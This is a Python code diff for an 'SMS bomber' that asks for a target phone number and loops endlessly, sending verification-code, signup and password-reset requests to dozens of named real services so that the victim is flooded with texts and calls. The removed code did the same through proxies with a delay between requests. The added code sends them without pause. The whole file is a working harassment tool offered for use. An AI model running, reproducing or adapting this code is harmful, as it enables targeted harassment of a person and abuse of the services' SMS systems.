@@ -1,4 +1,4 @@
-import requests
+import requests, random, datetime, sys, time, argparse, os
 from colorama import init, Fore, Back, Style
 from time import sleep
 import urllib.request
@@ -66,277 +66,320 @@ try:
         print('\n\n\tNOTIFICATION: ' + noti + '\n\n')
 except Exception:
     pass
-proxies = {
-    'http':'113.128.11.93:9999',
-    'http': '193.136.119.21:80',
-    'http': '46.45.129.16:80',
-    'http': '167.172.248.53:80',
-    'http': '138.201.223.250:31288',
-    'http': '136.243.47.220:3128',
-    'http': '91.225.104.182:80'
-}
+    
+    
+    
+_phone = input('Enter Target Number -->> ')
+
+_name = ''
+for x in range(12):
+	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+
+_phone9 = _phone[1:]
+_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
+_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
+_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
+_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
+_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
+
+iteration = 0
+while True:
+	_email = _name+f'{iteration}'+'@gmail.com'
+	email = _name+f'{iteration}'+'@gmail.com'
+	try:
+		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
+		print('[+] Grab Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
+		print('[+] RuTaxi Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
+		print('[+] BelkaCar Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
+		print('[+] Tinder Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
+		print('[+] Karusel Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
+		print('[+] Tinkoff Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
+		print('[+] MTS Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
+		print('[+] Youla Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
+		print('[+] PizzaHut Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
+		print('[+] Rabota Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
+		print('[+] Smsint Requests Successful!')
+	except:
+		print('[-] Requests Failed!')
+
+	try:
+		requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
+		print('[+] oyorooms Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
+		print('[+] MVideo Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
+		print('[+] newnext Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
+		print('[+] Sunlight Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
+		print('[+] alpari Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
+		print('[+] Invitro Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
+		print('[+] Sberbank Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
+		print('[+] Psbank Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
+		print('[+] Beltelcom Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
+		print('[+] Karusel Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
+		print('[+] KFC Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
+		print('[+] carsmile Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
+		print('[+] Citilink Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
+		print('[+] Delitime Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
+		print('[+] findclone звонок отправлен!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
+		print('[+] Guru Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
+		print('[+] ICQ Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
+		print('[+] InDriver Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
+		print('[+] Invitro Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
+		print('[+] Pmsm Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
+		print('[+] IVI Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
+		print('[+] Lenta Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
+		print('[+] Mail.ru Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
+		print('[+] MVideo Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
+		print('[+] OK Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://plink.tech/register/',json={"phone": _phone})
+		print('[+] Plink Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
+		print('[+] qlean Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
+		print('[+] SMSgorod Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
+		print('[+] Tinder Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
+		print('[+] Twitch Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
+		print('[+] CabWiFi Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
+		print('[+] wowworks Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
+		print('[+] Eda.Yandex Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
+		print('[+] Youla Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
+		print('[+] Alpari Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
+		print('[+] SMS Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
+
+	try:
+		requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
+		print('[+] Delivery Requests Successful!')
+	except:
+		print('[-]   Requests Failed!')
 
 
-a = input('Select target Number :')
-b = 999
-class services():
-	# service number 1
-	def service1(self, a, proxies):
-		r = requests.post('https://youla.ru/web-api/auth/request_code',
-			data = {"phone":a}, proxies=proxies)
-		print('youla.ru ' + str(r.status_code))
 
-	# service number 2
-	def service2(self, a, proxies):
-		r = requests.post('https://api.sunlight.net/v3/customers/authorization/',
-			data = {"phone":a}, proxies=proxies)
-		print('sunlight.net ' + str(r.status_code))
-
-	# service number 3
-	def service3(self, a, proxies):
-		r = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-			data = {"phone_number":a}, proxies=proxies)
-		print('tinder.com ' + str(r.status_code))
-
-	# service number 4
-	def service4(self, a, proxies):
-		r = requests.post('https://api.tinkoff.ru/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=RznyziZkeagDbs6SLIr13ZlfSjusxJbQ.m1-prod-api26&wuid=31ad89052c4944fd8cd55bcf419eefc1',
-			data = {"phone":a}, proxies=proxies)
-		print('tinkoff.ru ' + str(r.status_code))
-
-	# service number 5
-	def service5(self, a, proxies):
-		r = requests.post('https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&phone=79821432646',
-			data = {"phone":a,"oper":"9"})
-		print('sipnet.ru ' + str(r.status_code))
-
-	# service number 7
-	def service7(self, a, proxies):
-		r = requests.post('https://rutube.ru/api/accounts/sendpass/phone?phone=%2B79195346628',
-			data = {"phone":a}, proxies=proxies)
-		print('rutube.ru ' + str(r.status_code))
-
-	# service number 8
-	def service8(self, a, proxies):
-		r = requests.post('https://client.taximaxim.com/site/send-code/?type=0',
-			data = {"_csrf":"SuyaDpUnfWWvTkF8GytL1zAJqUUvLMc_SUXaEGhXsoQa2tJvwF8nC_YJEQpaHhKkVGCRIhljrggQJ4ljCW-G4Q==","LoginForm[org]":"maxim","LoginForm[country]":"ru","LoginForm[baseId]":"11","LoginForm[phone]":a,"LoginForm[code]":"","LoginForm[agree]":"0"}, proxies=proxies)
-		print('taximaxim.com ' + str(r.status_code))
-
-	# service number 9
-	def service9(self, a, proxies):
-		r = requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
-			data={"st.r.phone": a}, proxies=proxies)
-		print('ok.ru ' + str(r.status_code))
-
-	# service number 10	
-	def service10(self, a, proxies):
-		r = requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
-			data={"phone": a}, proxies=proxies)
-		print('prime.anytime.global ' + str(r.status_code))
-
-	# service number 11
-	def service11(self, a, proxies):
-		r = requests.post('https://belkacar.ru/get-confirmation-code',
-			data = {"phone": a}, proxies=proxies)
-		print('belkacar.ru ' + str(r.status_code))
-
-	# service number 12
-	def service12(self, a, proxies):
-		r = requests.post('https://api.delitime.ru/api/v2/signup', 
-			data={"SignupForm[username]": a, "SignupForm[device_type]": 3}, proxies=proxies)
-		print('delitime.ru ' + str(r.status_code))
-
-	# service number 13
-	def service13(self, a, proxies):
-		r = requests.post('https://www.delivery-club.ru/ajax/user_otp',
-			data={"phone": a}, proxies=proxies)
-		print('delivery-club.ru ' + str(r.status_code))
-
-    # service number 14
-	def service14(self, a, proxies):
-		r = requests.post('https://findclone.ru/register',
-			params={'phone': a}, proxies=proxies)
-		print('findclone.ru ' + str(r.status_code))
-
-	# service number 15
-	def service15(self, a, proxies):
-		r = requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
-			data={'msisdn': a, "locale": 'en', 'countryCode': 'ru',
-			'version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, proxies=proxies)
-		print('icq.com ' + str(r.status_code))
-
-	# service number 16
-	def service16(self, a, proxies):
-		r = requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
-			data={"mode": "request", "phone": a,
-				"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6",
-				"osversion": "unknown", "devicemodel": "unknown"}, proxies=proxies)
-		print('indriver.com ' + str(r.status_code))
-
-	# service number 17
-	def service17(self, a, proxies):
-		r = requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',
-			json={"phone": a}, proxies=proxies)
-		print('ube.pmsm.org.ru ' + str(r.status_code))
-
-	# service number 18
-	def service18(self, a, proxies):
-		r = requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',
-			json={'phone': a}, proxies=proxies)
-		print('kfc.ru ' + str(r.status_code))
-
-	# service number 19
-	def service19(self, a, proxies):
-		r = requests.post('https://cloud.mail.ru/api/v2/notify/applink',
-			json={"phone": a, "api": 2, "email": "email",
-				"x-email": "x-email"}, proxies=proxies)
-		print('mail.ru ' + str(r.status_code))
-
-	# service number 20
-	def service20(self, a, proxies):
-		r = requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
-    		json={"phone": a}, proxies=proxies)
-		print('qlean.ru ' + str(r.status_code))
-
-	# service number 21
-	def service21(self, a, proxies):
-		r = requests.post("https://api.wowworks.ru/v2/site/send-code",
-			json={"phone": a, "type": 2}, proxies=proxies)
-		print('wowworks.ru ' + str(r.status_code))
-
-	# service number 22
-	def service22(self, a, proxies):
-		r = requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
-			json={"phone_number": a}, proxies=proxies)
-		print('eda.yandex ' + str(r.status_code))
-
-	# service number 23
-	def service23(self, a, proxies):
-		r = requests.post('https://fix-price.ru/ajax/register_phone_code.php',
-			data = {"register_call": "Y",
-				"action": "getCode",
-				"phone": a}, proxies=proxies)
-		print('fix-price.ru ' + str(r.status_code))
-
-	# service number 24
-	def service24(self, a, proxies):
-		r = requests.post('https://vkusvill.ru/ajax/user_v2/auth/check_phone.php',
-			data={'USER_PHONE': a, 'token': '*','is_retry': 'Y'},
-			proxies=proxies)
-		print('vkusvill.ru ' + str(r.status_code))
-
-	# service number 25
-	def service25(self, a, proxies):
-		r= requests.post('https://service.uramobil.ru/profile/smstoken',
-			json={{'PhoneNumber': a, 'Captcha': 'rasd'}}, headers={},
-			proxies=proxies)
-		print('service,uramobil.ru ' + str(r.status_code))
-
-	# service number 26
-	def service26(self, a, proxies):
-		r = requests.post('http://taxiseven.ru/auth/register',
-			data={'phone': a}, headers={},
-			proxies=proxies)
-		print('taxiseven.ru ' + str(r.status_code))
-
-	# service number 27
-	def service27(self, a, proxies):
-		r = requests.post('https://pizzahut.ru/account/password-reset',
-			data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': phonePizzahut, '_token':'*'},
-			proxies=proxies)
-		print('pizzahut.ru ' + str(r.status_code))
-
-	# service number 28
-	def service28(self, a, proxies):
-		r = requests.post('https://www.rabota.ru/remind',
-			data={'credential': phone},
-			proxies=proxies)
-		print('rabota.ru ' + str(r.status_code))
-
-	# service number 29
-	def service29(self, a, proxies):
-		r = requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
-			json={'phone':phone},
-			proxies=proxies)
-		print('lenta.com ' + str(r.status_code))
-
-	# service number 30
-	def service30(self, a, proxies):
-		r = requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': a})
-		print('invitro.ru ' + str(r.status_cod))
-
-	# service number 31
-	def service31(self, a, proxies):
-		r = requests.post('https://online.sbis.ru/reg/service/',
-			json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':a},'id':'1'},
-			proxies=proxies)
-		print('sbis.ru ' + str(r.status_code))
-
-	# service number 32
-	def service32(self, a, proxies):
-		r = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru',
-			data={'phone': a},
-			proxies=proxies)
-		print('beltelecom.by ' + str(r.status_code))
-
-while 1:
-	services().service1(a,proxies)
-	sleep(b)
-	services().service2(a,proxies)
-	sleep(b)
-	services().service3(a,proxies)
-	sleep(b)
-	services().service4(a,proxies)
-	sleep(b)
-	services().service5(a,proxies)
-	sleep(b)
-	services().service7(a,proxies)
-	sleep(b)
-	services().service8(a,proxies)
-	sleep(b)
-	services().service8(a,proxies)
-	sleep(b)
-	services().service9(a,proxies)
-	sleep(b)
-	services().service10(a,proxies)
-	sleep(b)
-	services().service12(a,proxies)
-	sleep(b)
-	services().service13(a,proxies)
-	sleep(b)
-	services().service14(a,proxies)
-	sleep(b)
-	services().service15(a,proxies)
-	sleep(b)
-	services().service16(a,proxies)
-	sleep(b)
-	services().service17(a,proxies)
-	sleep(b)
-	services().service18(a,proxies)
-	sleep(b)
-	services().service19(a,proxies)
-	sleep(b)
-	services().service20(a,proxies)
-	sleep(b)
-	services().service21(a,proxies)
-	sleep(b)
-	services().service22(a,proxies)
-	sleep(b)
-	services().service23(a,proxies)
-	sleep(b)
-	services().service24(a,proxies)
-	sleep(b)
-	services().service26(a,proxies)
-	sleep(b)
-	services().service27(a,proxies)
-	sleep(b)
-	services().service28(a,proxies)
-	sleep(b)
-	services().service29(a,proxies)
-	sleep(b)
-	services().service30(a,proxies)
-	sleep(b)
-	services().service31(a,proxies)
-	sleep(b)
-	services().service32(a,proxies)
-	sleep(b)
+	try:
+		iteration += 1
+		print(('{} the tour is complete.').format(iteration))
+	except:
+		break
